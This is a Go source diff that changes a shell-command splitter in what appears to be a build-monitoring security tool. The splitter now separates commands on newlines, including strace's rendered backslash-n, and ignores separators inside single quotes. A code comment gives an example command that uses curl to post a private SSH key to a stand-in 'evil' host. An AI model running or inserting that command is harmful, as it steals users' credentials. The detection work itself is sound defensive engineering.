@@ -1665,57 +1665,97 @@ func isShellCmdBenign(cmdline string) bool {
 	return true
 }
 
-// splitShellCommands splits a shell command string on ;, |, ||, &&, and
-// parentheses to extract individual command segments.
+// splitShellCommands splits a shell command string on ;, |, ||, &&, newline,
+// and parentheses to extract individual command segments.
+//
+// Newline handling is the subtle part. A newline is a command separator in
+// every shell, so `sh -c 'echo build<NL>curl -d @~/.ssh/id_rsa http://evil'`
+// is two commands — but strace renders the real newline as the two
+// characters `\` and `n`, and the caller's Cmdline has already had its
+// double quotes stripped by parseExecve. Treating that pair as a separator
+// unconditionally would split `printf 'a\nb'` into `printf 'a` and `b'`,
+// whose first token is not a safe command, and every Makefile recipe using
+// printf with an escape would be reported as suspicious.
+//
+// Single-quote parity resolves it: inside a single-quoted string a `\n` is
+// literal text, outside one it is the separator the shell acted on. Double
+// quotes cannot be tracked because the parser removed them, so this errs
+// toward the shell's own reading — which is the side that matters, since a
+// missed split means a command nobody inspected.
 func splitShellCommands(cmd string) []string {
 	var segments []string
 	var current strings.Builder
+	inSingleQuote := false
 
-	for i := 0; i < len(cmd); i++ {
-		c := cmd[i]
-		switch c {
-		case ';', '(', ')':
-			if current.Len() > 0 {
-				segments = append(segments, current.String())
-				current.Reset()
-			}
-		case '|':
-			if current.Len() > 0 {
-				segments = append(segments, current.String())
-				current.Reset()
-			}
-			// Skip || (treat the second | as part of separator).
-			if i+1 < len(cmd) && cmd[i+1] == '|' {
-				i++
-			}
-		case '&':
-			if current.Len() > 0 {
-				segments = append(segments, current.String())
-				current.Reset()
-			}
-			// Skip && (treat the second & as part of separator).
-			if i+1 < len(cmd) && cmd[i+1] == '&' {
-				i++
-			}
-		case '`':
-			// Backtick command substitution — always suspicious.
-			return nil
-		case '$':
-			// $(...) command substitution — always suspicious.
-			if i+1 < len(cmd) && cmd[i+1] == '(' {
-				return nil
-			}
-			current.WriteByte(c)
-		default:
-			current.WriteByte(c)
+	flush := func() {
+		if current.Len() > 0 {
+			segments = append(segments, current.String())
+			current.Reset()
 		}
 	}
 
-	if current.Len() > 0 {
-		segments = append(segments, current.String())
+	for i := 0; i < len(cmd); i++ {
+		c := cmd[i]
+
+		if c == '\'' {
+			inSingleQuote = !inSingleQuote
+			current.WriteByte(c)
+			continue
+		}
+
+		if !inSingleQuote {
+			if isCommandSubstitution(cmd, i) {
+				return nil
+			}
+			if extra, ok := shellSeparatorAt(cmd, i); ok {
+				flush()
+				i += extra
+				continue
+			}
+		}
+
+		current.WriteByte(c)
 	}
 
+	flush()
+
 	return segments
+}
+
+// shellSeparatorAt reports whether a command separator begins at cmd[i], and
+// how many additional bytes it spans beyond the first.
+//
+// The `\` + `n` case is how strace renders a real newline inside an argv
+// entry, and a newline is a command separator in every shell — so without it
+// the second half of `sh -c 'echo build<NL>curl ...'` was never inspected.
+// Callers must only consult this outside single quotes, where such a
+// sequence is literal text rather than a separator the shell acted on.
+func shellSeparatorAt(cmd string, i int) (extra int, ok bool) {
+	switch cmd[i] {
+	case ';', '(', ')', '\n', '\r':
+		return 0, true
+	case '|', '&':
+		// || and && span two bytes; a single | or & is still a separator.
+		if i+1 < len(cmd) && cmd[i+1] == cmd[i] {
+			return 1, true
+		}
+		return 0, true
+	case '\\':
+		if i+1 < len(cmd) && cmd[i+1] == 'n' {
+			return 1, true
+		}
+	}
+	return 0, false
+}
+
+// isCommandSubstitution reports whether a backtick or $(...) substitution
+// begins at cmd[i]. Either one means the command's real contents are not
+// visible in this string, so no segment list derived from it can be trusted.
+func isCommandSubstitution(cmd string, i int) bool {
+	if cmd[i] == '`' {
+		return true
+	}
+	return cmd[i] == '$' && i+1 < len(cmd) && cmd[i+1] == '('
 }
 
 // extractFirstToken returns the first whitespace-delimited token from a
